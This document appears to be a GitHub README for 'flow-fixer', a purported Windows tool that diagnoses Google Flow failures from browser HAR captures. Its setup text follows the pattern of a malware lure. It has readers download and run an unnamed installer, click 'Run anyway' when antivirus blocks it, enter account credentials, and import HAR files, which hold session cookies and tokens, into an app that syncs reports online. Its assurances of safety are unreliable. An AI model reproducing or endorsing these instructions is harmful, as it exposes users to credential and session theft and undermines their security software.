# 🛠️ flow-fixer - Improve reliability of Google Flow workflows

[![Download flow-fixer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lowlevel-perimeter652/flow-fixer)

flow-fixer helps you manage your Google Flow tasks. It collects data from your browser to show you why failures occur. You can use this tool to track errors, check fan-out performance, and create briefs for your engineering team. This software provides diagnostic data for reliability testing.

## 📋 What this tool does

Google Flow processes often stop due to network issues or rate limits. Flow-fixer connects to your browser session to record these events. It saves this information in a file format called HAR. The tool reads these files to find patterns in your failures. You get a clear report on what happened. 

You can use the tool to:
* Find hidden errors in your browser activity.
* Analyze how your tasks spread across your infrastructure.
* Keep logs of your work for performance reviews.
* Manage limits on your request volume.

This tool does not change how Google Flow works. It does not bypass security. It only reads your own session logs to help you fix errors.

## 💻 System requirements

Your computer needs to meet these standards to run flow-fixer:

* Operating System: Windows 10 or Windows 11 (64-bit).
* Memory: 4GB of RAM or more.
* Storage: 200MB of free disk space.
* Web Browser: Google Chrome or Microsoft Edge.
* Network: A stable internet connection to sync your reports.

## 🚀 How to install

Follow these steps to set up the software on your Windows computer.

1. Go to the [official release page](https://github.com/Lowlevel-perimeter652/flow-fixer).
2. Look for the most recent version of the application.
3. Click the file link to save the program to your computer.
4. Locate the file in your downloads folder.
5. Double-click the file to open the installer.
6. Follow the instructions on the screen to finish the setup.
7. Click Finish to close the installer window.

## ⚙️ Using the application

Once you finish the installation, you can open the program from your Desktop or the Start menu.

1. Open the application.
2. Sign in with your account if the app asks for credentials.
3. Navigate to the diagnostic tab in the main window.
4. Open the Developer Tools in your Chrome browser by pressing F12.
5. Go to the Network tab and record your flow session.
6. Save the data as a HAR file through the browser menu.
7. Import that HAR file into flow-fixer.
8. Press the Analyze button to generate your reliability report.

The tool shows a list of requests. You can click on any request to see why it failed. The report will explain if you hit a rate limit or if the connection dropped. 

## ❓ Frequently asked questions

Do I need programming skills?
No. You do not need to write code. The user interface handles all technical tasks.

Is this tool safe?
Yes. The software only reads the local files you provide. It does not send your private browser data to external servers without your permission.

What is a HAR file?
A HAR file is a standard way for browsers to save activity logs. They contain the data needed for forensic analysis.

Where do I save my reports?
The software creates a folder in your Documents directory called "FlowFixerReports." It saves all analysis briefs there by default.

## 🛠️ Troubleshooting common issues

If the application does not open, check if your antivirus software is blocking the file. Some systems flag new software as a precaution. Click "Run anyway" if your system presents a warning screen.

Make sure you run the tool as a standard user. You do not need administrator rights for normal operation. If the reporting window stays empty, verify that your browser recorded the activity correctly before you saved the HAR file.

Keywords: chrome-devtools, forensics, google-flow, google-labs, har, observability, python, rate-limiting, recaptcha, reliability, veo